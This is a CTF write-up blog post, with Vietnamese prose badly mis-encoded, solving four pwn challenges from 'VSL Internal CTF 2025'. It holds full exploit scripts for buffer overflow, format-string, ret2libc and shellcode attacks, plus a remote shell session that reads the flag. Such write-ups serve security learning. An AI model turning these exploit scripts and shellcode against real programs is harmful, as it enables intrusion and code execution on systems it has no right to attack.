---
title: "[WRITE UP] - VSL Internal CTF 2025"
description: 'Yes, a CTF Write up'
image: '../../img/cover_photo_wup_imresizer.png'
date: 2025-01-31
tags: ['2025', 'WriteUp', 'PWN']
authors: ['kdot']
draft: false
---

# Táº£n máº¡n

Váº­y lÃ  cÅ©ng Ä‘Ã£ háº¿t Táº¿t, sau má»™t thá»i gian lÆ°á»i dÃ i Æ¡i lÃ  dÃ i thÃ¬ mÃ¬nh quyáº¿t Ä‘á»‹nh báº¯t Ä‘áº§u viáº¿t full write up cho giáº£i `VSL Internal CTF 2025` Ä‘Æ°á»£c tá»• chá»©c bá»Ÿi `VKU`. Trong giáº£i nÃ y mÃ¬nh Ä‘Ã£ may máº¯n Ä‘Æ°á»£c tham gia cÃ¹ng cÃ¡c anh chá»‹ `EHC`, vÃ  cÃ¹ng nhau Ä‘Æ°á»£c top 2

![alt text](../../img/VSL/image-1.png)

DÆ°á»›i Ä‘Ã¢y sáº½ lÃ  pháº§n giáº£i cá»§a mÃ¬nh cho táº¥t cáº£ nhá»¯ng bÃ i pwn mÃ¬nh lÃ m Ä‘Æ°á»£c, kÃ¨m theo lá»i giáº£i thÃ­ch ngáº¯n gá»n

# Challenges

## Beginner

```sh
[*] '/home/alter/CTFs/VSL/Beginner/bofbegin'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[12]; // [esp+4h] [ebp-28h] BYREF
  char v5[12]; // [esp+10h] [ebp-1Ch] BYREF
  int v6; // [esp+1Ch] [ebp-10h]
  unsigned int v7; // [esp+20h] [ebp-Ch]
  int *p_argc; // [esp+24h] [ebp-8h]

  p_argc = &argc;
  v7 = __readgsdword(0x14u);
  v6 = GUEST_ID;
  printf("Enter username: ");
  fflush(stdout);
  gets(s);
  printf("Enter password: ");
  fflush(stdout);
  gets(v5);
  if ( !strcmp(s, "admin") )
  {
    if ( v6 == ROOT_ID )
    {
      puts("Welcome, root!");
      fflush(stdout);
      system("/bin/sh");
    }
    else
    {
      if ( v6 == GUEST_ID )
        puts("Welcome, guest!");
      else
        puts("Nice try, but you are not root!");
      fflush(stdout);
    }
  }
  else
  {
    printf("Welcome, %s!\n", s);
    fflush(stdout);
  }
  return 0;
}
```

Dá»±a vÃ o IDA ta tháº¥y Ä‘Æ°á»£c Ä‘Ã¢y lÃ  má»™t bÃ i `Buffer Overflow` Ä‘Æ¡n giáº£n khi nhá»¯ng gÃ¬ ta cáº§n chá»‰ lÃ  cho v6 báº±ng `ROOT_ID`, khi check kÄ© `.data` hÆ¡n thÃ¬ mÃ¬nh tháº¥y `ROOT_ID` Ä‘Æ°á»£c khai bÃ¡o vá»›i giÃ¡ trá»‹ `1337`. VÃ  Ä‘Ã¢y lÃ  exploit cá»§a mÃ¬nh cho bÃ i nÃ y:

```py
#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./bofbegin', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

def exploit():

    pl = b'A'*0xc + p32(1337)

    sl(b'admin')
    sl(pl)

    interactive()

if __name__ == '__main__':
    exploit()
```

## Interesting Functions

```sh
[*] '/home/alter/CTFs/VSL/Interesting_Functions/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Má»™t bÃ i khÃ¡ hay vá» `Buffer Overflow` vÃ  `Format String`, hÃ£y cÃ¹ng xem IDA xem nÃ³ cÃ³ nhá»¯ng gÃ¬:

- `main()`:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-110h] BYREF
  char v5[267]; // [rsp+1h] [rbp-10Fh] BYREF
  int v6; // [rsp+10Ch] [rbp-4h] BYREF

  memset(&s, 0, 0x101uLL);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  menu();
  while ( 1 )
  {
    while ( 1 )
    {
      printf("> ");
      if ( (unsigned int)__isoc99_scanf("%d%*c", &v6) != 1 )
        return 1;
      if ( v6 != 3 )
        break;
      if ( s )
      {
        puts("You only have one chance to print string");
      }
      else
      {
        printf(v5);
        s = 1;
      }
    }
    if ( v6 > 3 )
      break;
    if ( v6 == 1 )
    {
      get_data();
      strcpy(v5, g_buf);
    }
    else
    {
      if ( v6 != 2 )
        return 0;
      get_data();
      strcat(v5, g_buf);
    }
  }
  return 0;
}
```

- `get_data()`:
```
char *get_data()
{
  printf("data: ");
  return fgets(g_buf, 256, stdin);
}
```
- `win()`:
```c
int win()
{
  int result; // eax
  char buf[108]; // [rsp+0h] [rbp-70h] BYREF
  int fd; // [rsp+6Ch] [rbp-4h]

  fd = open("flag.txt", 0, 0LL);
  result = pwd;
  if ( pwd == 4919 )
  {
    read(fd, buf, 0x64uLL);
    return puts(buf);
  }
  return result;
}
```

NhÃ¬n sÆ¡ qua thÃ¬ tÆ°á»Ÿng chá»«ng khÃ´ng cÃ³ `Buffer Overflow` nhÆ°ng khi Ä‘á»ƒ Ã½ kÄ© thÃ¬ ta tháº¥y flow cá»§a chÆ°Æ¡ng trÃ¬nh sáº½ lÃ :

- Cho ta chá»n cÃ¡c options
- Náº¿u `1` thÃ¬ sáº½ nháº­n input cá»§a ta thÃ´ng qua hÃ m `get_data()`, vÃ  rá»“i sá»­ dá»¥ng `strcpy()` Ä‘á»ƒ copy data Ä‘Ã³ vÃ o `buf` (lÃ  pháº§n Ä‘Æ°á»£c khai bÃ¡o trÃªn stack)
- Náº¿u `2` thÃ¬ sáº½ nháº­n input cá»§a ta thÃ´ng qua hÃ m `get_data()`, vÃ  rá»“i sá»­ dá»¥ng `strcat()` Ä‘á»ƒ copy data Ä‘Ã³ vÃ o `buf` (lÃ  pháº§n Ä‘Æ°á»£c khai bÃ¡o trÃªn stack)
- Náº¿u lÃ  `3` thÃ¬ sáº½ in ra input mÃ  ta nháº­p nhÆ°ng chá»‰ Ä‘Æ°á»£c sá»­ dá»¥ng má»™t láº§n

NhÆ°ng Ä‘áº·t biá»‡t á»Ÿ Ä‘Ã¢y lÃ  chÆ°Æ¡ng trÃ¬nh sá»­ dá»¥ng `strcpy` vÃ  `strcat`, Ä‘iá»u nguy hiá»ƒm á»Ÿ Ä‘Ã¢y lÃ  `strcpy` sáº½ copy dá»¯ liá»‡u cá»§a ta vÃ  sáº½ khÃ´ng quan tÃ¢m Ä‘áº¿n kÃ­ch thÆ°á»›c cá»§a Ä‘oáº¡n dá»¯ liá»‡u mÃ  nÃ³ copy cho Ä‘áº¿n khi nÃ³ gáº·p `NULL BYTE`, nhÆ°ng vÃ¬ á»Ÿ Ä‘Ã¢y hÃ m `fgets` Ä‘Æ°á»£c set input size lÃ  `256` nÃªn nÃ³ chá»‰ sáº½ copy Ä‘Æ°á»£c `256` byte dá»¯ liá»‡u cá»§a ta. NhÆ°ng bÃªn cáº¡nh Ä‘Ã³ ta cÃ³ thá»ƒ sá»­ dá»¥ng thÃªm `strcat` Ä‘á»ƒ ná»‘t chuá»—i, `strcat` sáº½ ná»‘i chuá»—i sau mÃ  ta nháº­p vÃ o nÆ¡i cÃ³ kÃ­ tá»± káº¿t thÃºc hay `NULL` mÃ  nÃ³ báº¯t gáº·p, ghi Ä‘Ã¨ nÃ³, vÃ  khi ná»‘i xong nÃ³ sáº½ thÃªm `NULL` vÃ o cuá»‘i cá»§a Ä‘oáº¡n `data` Ä‘Ã³. NÃªn á»Ÿ bÃ i nÃ y idea cá»§a mÃ¬nh sáº½ lÃ  dÃ¹ng `strcpy` vÃ  `strcat` Ä‘á»ƒ thá»±c hiá»‡n `Buffer Overflow` vÃ  bÃªn cáº¡nh Ä‘Ã³ sá»­ dá»¥ng `Format String` á»Ÿ option 3 (`printf(v5)`), Ä‘á»ƒ thay Ä‘á»•i giÃ¡ trá»‹ cá»§a `pwd` ban Ä‘áº§u Ä‘Æ°á»£c khai bÃ¡o á»Ÿ `.bss` thÃ nh `4919`.

```py
#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*main+238
b*main+279
b*main+316
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)

if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

'''
The strcat() function appends the src string to the dest string,
overwriting the terminating null byte ('\0') at
the end of dest and then adds a terminating null byte.
'''

'''
[*] '/home/alter/CTFs/VSL/Interesting_Functions/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''

def exploit():

    # 1. strcpy
    # 2. strcat
    # 3. printf

    # Change pwd value
    pl = f'%{0x1337}c%9$n'.encode()
    pl = pl.ljust(0x17, b'A')
    pl += p64(0x4041c0) # pwd

    sla(b'> ', b'1')
    sla(b'data: ', pl)
    sla(b'> ', b'3')

  # Buffer Overflow
  # Add NULL byte at the end of the first time
    pl = cyclic(255)
    sla(b'> ', b'1')
    sla(b'data: ', pl)

    pl = (cyclic_find(b'gaaa') + 2)*b'B' + p64(exe.sym.win)
    sla(b'> ', b'2')
    sla(b'data: ', pl)

  # Add NULL byte at the end second time
    pl = cyclic(255)
    sla(b'> ', b'1')
    sla(b'data: ', pl)

    pl = (cyclic_find(b'gaaa') + 1)*b'C' + p64(exe.sym.win)
    sla(b'> ', b'2')
    sla(b'data: ', pl)

  # Add NULL byte at the end third time
    pl = cyclic(255)
    sla(b'> ', b'1')
    sla(b'data: ', pl)

    pl = cyclic(cyclic_find(b'gaaa')) + p64(exe.sym.win)
    sla(b'> ', b'2')
    sla(b'data: ', pl)

  # Break the loop and return to win
    sla(b'> ', b'4')

    interactive()

if __name__ == '__main__':
    exploit()
```

á» exploit mÃ¬nh sá»­ dá»¥ng `strcat` nhÆ° lÃ  thá»© Ä‘á»ƒ Ä‘áº·t `NULL` byte vÃ o `saved rip` Ä‘á»ƒ `reset` nÃ³ vá» `0` Ä‘á»ƒ ta cÃ³ thá»ƒ ghi giÃ¡ trá»‹ má»›i vÃ o nÃ³, vÃ¬ náº¿u ta dÃ¹ng `strcat` Ä‘á»ƒ ná»‘i chuá»—i cÃ³ Ä‘á»‹a chá»‰ cá»§a hÃ m `win` vÃ o thÃ¬ nÃ³ chá»‰ cÃ³ thá»ƒ bá»‹ ghi Ä‘Ã¨ `4 bytes` cuá»‘i vÃ  Ä‘iá»u nÃ y sáº½ lÃ m chÆ°Æ¡ng trÃ¬nh bá»‹ crash.

## Present

```sh
[*] '/home/alter/CTFs/VSL/Present/libpwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[48]; // [rsp+20h] [rbp-30h] BYREF

  setup((unsigned int)argc, argv, envp);
  puts("Hi, Welcome to the pwn challenge!");
  puts("This program is just a print function. Bye!");
  puts("But wait, I have a present for you!");
  printf("%p\n", &fgets);
  printf("Please give me your present: ");
  gets(v4);
  return 0;
}
```

Má»™t bÃ i thá»ƒ hiá»‡n rÃµ kÄ© thuáº­t `ret2libc`, nÃªn mÃ¬nh khÃ´ng suy nghÄ© gÃ¬ thÃªm vÃ  viáº¿t exploit luÃ´n:

```py
#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./libpwn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*main+152
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)

if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

def exploit():

    ru(b'But wait, I have a present for you!\n')
    libc.address = hexleak(rl()) - libc.sym.fgets
    slog('Libc base',libc.address)

    pl = cyclic(0x38) + p64(0x0000000000401016) + p64(0x000000000010f75b + libc.address) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
    sla(b'present:', pl)

    interactive()

if __name__ == '__main__':
    exploit()
```

## asm machine

á» bÃ i nÃ y lÃ  má»™t bÃ i shellcode vÃ  lÃ  má»™t bÃ i khÃ¡ thÃº vá»‹ Ä‘á»‘i vá»›i cÃ¡ nhÃ¢n mÃ¬nh, flow cá»§a chÆ°Æ¡ng trÃ¬nh chá»‰ cÆ¡ báº£n lÃ  thá»±c thi nhá»¯ng Ä‘oáº¡n mÃ£ `assembly` mÃ  ta nháº­p vÃ o nÃªn mÃ¬nh Ä‘Ã£ khÃ´ng ngáº§n ngáº¡i viáº¿t má»™t Ä‘oáº¡n shellcode Ä‘á»ƒ `get shell`:

```sh
alter ^ Sol in ~/CTFs/VSL/Present
$ nc 61.14.233.78 10004
Enter your assembly code (type 'end' to finish):
section .text
    global _start

_start:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov eax, 11
    int 0x80

end
[!] Compiling and running the assembly code...
ls
entry.sh
main.py
cd ..
ls
app
bin
boot
dev
etc
flag.txt
<...>
cat flag.txt
VSL{d0d73fb9a4d7e40b0cc6870fc2c4ba67}
```

NgoÃ i ra mÃ¬nh cÃ³ thá»­ shellcode `orw` xem nÃ³ cÃ³ hoáº¡t Ä‘á»™ng khÃ´ng:

```sh
alter ^ Sol in ~/CTFs/VSL/Present
$ nc 61.14.233.78 10004
Enter your assembly code (type 'end' to finish):
section .data
    filename db '/flag.txt', 0

section .text
    global _start

_start:
    ; open
    xor eax, eax
    mov ebx, filename
    xor ecx, ecx
    mov al, 5
    int 0x80

    ; read
    mov ebx, eax
    xor eax, eax
    mov ecx, esp
    mov edx, 100
    mov al, 3
    int 0x80

    ; write
    mov eax, 4
    mov ebx, 1
    int 0x80

    xor eax, eax
    mov al, 1
    xor ebx, ebx
    int 0x80

end
[!] Compiling and running the assembly code...
VSL{d0d73fb9a4d7e40b0cc6870fc2c4ba67}nï¿½ï¿½
                                        oï¿½ï¿½oï¿½ï¿½&oï¿½ï¿½>oï¿½ï¿½woï¿½ï¿½ï¿½oï¿½ï¿½ï¿½oï¿½ï¿½ï¿½oï¿½ï¿½ @ï¿½ï¿½!ï¿½ï¿½3ï¿½
[+] Assembly code compiled and run successfully
```

á» bÃ i nÃ y thÃ¬ mÃ¬nh khÃ´ng cÃ³ bá»‹ gáº·p viá»‡c end `EOF` khi thá»±c thi `execve` nhÆ°ng anh `mentor` cá»§a mÃ¬nh thÃ¬ cÃ³ ğŸ¥¹.  NÃªn ta cÃ³ thá»ƒ sá»­ dá»¥ng syscall `getdents` Ä‘á»ƒ list ra nhá»¯ng thá»© cÃ³ trong thÆ°  má»¥c Ä‘Ã³ tá»« Ä‘Ã³ tÃ¬m Ä‘c path Ä‘Ãºng cá»§a flag vÃ  viáº¿t shellcode `orw` cho nÃ³
